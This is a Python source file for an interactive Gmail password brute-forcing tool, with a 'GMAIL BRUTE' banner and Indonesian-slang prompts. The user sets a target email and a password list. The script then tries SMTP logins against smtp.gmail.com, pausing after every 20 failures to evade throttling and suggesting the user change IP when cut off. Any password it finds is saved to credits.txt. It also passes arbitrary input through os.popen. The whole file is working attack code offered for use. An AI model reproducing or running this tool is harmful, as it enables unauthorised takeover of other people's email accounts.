import smtplib , os , sys , time
import sys
import os
import time
from termcolor import colored

r="\x1b[91;1m"
g="\x1b[32;1m"
y="\x1b[33;1m"
p="\x1b[34;1m"
c="\x1b[36;1m"
o="\x1b[37;1m"
w="\x1b[00m"
u="\x1b[4m"
b="\x1b[5m"

Count = 0
_Count = 0

def Banner():
	Ban = " "+r+"\n\t\t\t\n⢀⣠⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣄⡀\n⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷\n⣿⣿⣿⡿⠛⠉⠉⠙⠿⣿⣿⣿⣿⠿⠋⠉⠉⠛⢿⣿⣿⣿\n⣿⣿⣿⣶⣿⣿⣿⣦⠀⢘⣿⣿⡃⠀⣴⣿⣿⣿⣶⣿⣿⣿\n⣿⣿⣿⣏⠉⠀⠈⣙⣿⣿⣿⣿⣿⣿⣋⠁⠀⠉⣹⣿⣿⣿\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⢸⣿⣿⣎⠻⣿⣿⣿⣿⡿⠋⠙⢿⣿⣿⣿⣿⠟⣱⣿⣿⡇\n ⢿⣿⣿⣧⠀⠉⠉⠉⠀⢀⡀⠀⠉⠉⠉⠀⣼⣿⣿⡿⠀\n ⠈⢻⣿⣿⣷⣶⣶⣶⣶⣿⣿⣶⣶⣶⣶⣾⣿⣿⡟⠁\n   ⠹⣿⣿⣿⣿⣿⣿⠉⠉⣿⣿⣿⣿⣿⣿⠏\n    ⠈⠻⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⠟⠁\n       ⠙⠻⢿⣦⣴⡿⠟⠋\n\n"+w+"\n  ▄████  ███▄ ▄███▓ ▄▄▄       ██▓ ██▓        ▄▄▄▄    ██▀███   █    ██ ▄▄▄█████▓▓█████ \n ██▒ ▀█▒▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒       ▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀ \n▒██░▄▄▄░▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░       ▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░▒ ▓██░ ▒░▒███   \n░▓█  ██▓▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░       ▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄ \n░▒▓███▀▒▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒   ░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓   ▒██▒ ░ ░▒████▒\n ░▒   ▒ ░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░   ░▒▓███▀▒░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░\n  ░   ░ ░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░   ▒░▒   ░   ░▒ ░ ▒░░░▒░ ░ ░     ░     ░ ░  ░\n░ ░   ░ ░      ░     ░   ▒    ▒ ░  ░ ░       ░    ░   ░░   ░  ░░░ ░ ░   ░         ░   \n  ░        ░         ░  ░ ░      ░  ░    ░         ░        ░                 ░  ░\n\t\t\t"; print(Ban)

def StartBruteAccount(Passlist,account,SMTPServer,Count,_Count,Time):
	with open('{0}'.format(Passlist),'r') as PasswordsFile:
		for Password in PasswordsFile:
			Password = Password.rstrip("\n")
			try:
				SMTPServer.login(account,Password)
				print("[+] Valid Password Has Been Found: {0}, For: {1}".format(Password,account))
				
				# Create Data File!
				with open('credits.txt' , 'a') as DataFile:
					DataFile.write("\n--------------------------------------->"); DataFile.write(" "+g+"[!]"+r+" Email Target: {0}\n".format(account)); DataFile.write(" "+g+"[!]"+r+" Password nya nih bro: {0}\n".format(Password)); DataFile.write("--------------------------------------->");DataFile.close()
				exit()
			except smtplib.SMTPAuthenticationError:
				Count += 1; _Count += 1
				if Count == 20:
					print(" "+c+"[!]"+r+"\n istirahat dulu broh capek gw cuma {0} detik kok 😅.".format(str(Time))); time.sleep(int(Time)); Count = 0
					SMTPServer.close()

					SMTPServer = StartSMTPServiceForGmail()
				else:
					print("\rsedang meretas: {0}".format(Password + "   ") , end="")
					sys.stdout.flush()
			except Exception as e:
				if "please run connect() first" in str(e):
					SMTPServer.close()
					print("\nServer SMTP Terputus. Silakan Jalankan Alat Lagi Setelah Mengubah Alamat IP Anda Atau Setelah Menunggu Beberapa Saat"); exit()
				else:
					print("Error: " + str(e))

def StartSMTPServiceForGmail():
	SMTPServer = smtplib.SMTP('smtp.gmail.com', 587)
	SMTPServer.ehlo()
	SMTPServer.starttls()
	return SMTPServer

def HelpGuide():
	print("\n👋  - Help Guide For To use.")
	print("List command:")
	print("\thelp\t\t"+c+">>"+r+"\tuntuk memunculkan pesan ini")
	print("\tset target\t"+c+">>"+r+"\tuntuk set target yg anda inginkan")
	print("\tset time\t"+c+">>"+r+"\tuntuk meng-set waktu atau delay minimal 10s")
	print("\tset list\t"+c+">>"+r+"\tNama list pw seperti /home/../PassList.txt ")
	print("\tshow target\t"+c+">>"+r+"\tuntuk melihat target anda ")
	print("\tshow time\t"+c+">>"+r+"\tuntuk melihat waktu dan delay ")
	print("\tshow list\t"+c+">>"+r+"\tuntuk melihat list file password")
	print("\tload\t\t"+c+">>"+r+"\tuntuk memakai settingan yg sudah ada melalui path")
	print("\tstart\t\t"+c+">>"+r+"\tuntuk memulai peretasan akun\n")
	print("\texit\t\t"+c+">>"+r+"\tuntuk keluar dari script")

def ContactMe():
	Gmail =  "ryanzx0o0@gmail.com" # Don't perform the brute-force attacks on my email.

def StartShell():
	# store how many times the user pressed Ctrl + C
	AbortCount = 0
	Commands = []
	Account = ''
	Time = ''
	PassList = ''
	with open(os.path.join("data" , "Commands") ,'r') as CommandsFile:
		for Command in CommandsFile:
			Command = Command.rstrip("\n")
			Commands.append(Command)
	while True:
		# init variable to store user input
		ShellResponse = ''
		try:
			# get input from user
			ShellResponse = input(c+"[+]"+r+"root@DappyNet😎 : ")

		# handle Ctrl + C
		except KeyboardInterrupt:
			# increment AbortCount
			AbortCount += 1
			# print \n to print the new shell line on the next line
			print()
			# if the user pressed Ctrl + C two times
			if AbortCount >= 2:
				# print hint
				print("[!] Press Ctrl + D or enter 'exit' to abort the program.")
				# reset abortcount
				AbortCount = 0
			continue
		# handle Ctrl + D
		# Ctrl + D normally indicated the end of a file
		# this is why python throws an EOFError
		except EOFError:
			print()
			exit()

		if ShellResponse.lower().replace(' ' , '') not in Commands:
			if "s-" in ShellResponse.lower():
				Command = ShellResponse.split("-"); Command = Command[1]
				Results = os.popen(Command).read()
				print("Command:" + Command)
				print("Results: \n{0}".format(Results))
			else:
				print("Can't find the command: '{0}'".format(ShellResponse))
		elif ShellResponse.lower() == "help":
			HelpGuide()
		elif ShellResponse.lower().replace(' ' , '') == "settarget":
			Account = input("Target: ")
		elif ShellResponse.lower().replace(' ' , '') == "settime":
			Time = input("Time: ")
		elif ShellResponse.lower().replace(' ' , '') == "setlist":
			PassList = input("List: ")
		elif ShellResponse.lower().replace(' ' , '') == "showtarget":
			if Account == '':
				print(" "+c+"[?]"+r+" lu belum kasih target broh ☹️")
			else:
				print("Target: " + Account)
		elif ShellResponse.lower().replace(' ' , '') == "showtime":
			if Time == '':
				print(" "+c+"[?]"+r+" lu belum kasih gw delay broh 🤔")
			else:
				print(" "+c+"[?]"+r+"Time: " + Time)
		elif ShellResponse.lower().replace(' ' , '') == "showlist":
			if PassList == '':
				print(" "+c+"[?]"+r+" lu g naruh file nya broh 😔")
			else:
				print("List: " + PassList)
		elif ShellResponse.lower() == "start":
			StartSMTPServiceForGmail()
			Service = StartSMTPServiceForGmail()
			if Account == '':
				print(" "+c+"[!]"+r+" Mendapatkan Target!")
				break
			elif PassList == '':
				print(" "+c+"[!]"+r+" Mendapatkan list!")
				break
			elif Time == '':
				print(" "+c+"[!]"+r+" Mendapatkan waktu delay!")
				break
			else:
				StartBruteAccount(PassList,Account,Service,Count,_Count,Time)
		elif ShellResponse.lower() == "exit":
			exit()
		elif ShellResponse.lower() == "load":
			Config = input("Path File Nya Broh?: ")
			if os.path.exists(Config):
				Settings = open(Config , 'r')

				for Line in Settings:
					Line = Line.rstrip("\n"); Options = Line.split(":")

					try:
						if Options[0] == "email":
							Account = Options[1]
							print("Target: {0}".format(Options[1]))
						elif Options[0] == "list":
							PassList = Options[1]
							print("List: {0}".format(PassList))
						elif Options[0] == "time":
							Time = Options[1]
							print("Time: {0}".format(Time))
						else:
							print(" "+c+"[-]"+r+" yg bener lu broh g ada file nya cok 🤔")
					except Exception:
						print(" "+c+"[-]"+r+" Ini g bisa ke baca broh coba lagi ya 😁")
			else:
				print(" "+c+"[-]"+r+" G ada broh file nya gw g nemu ulang lagi coba!!")
		else:
			pass


# Start
Banner()
StartShell()
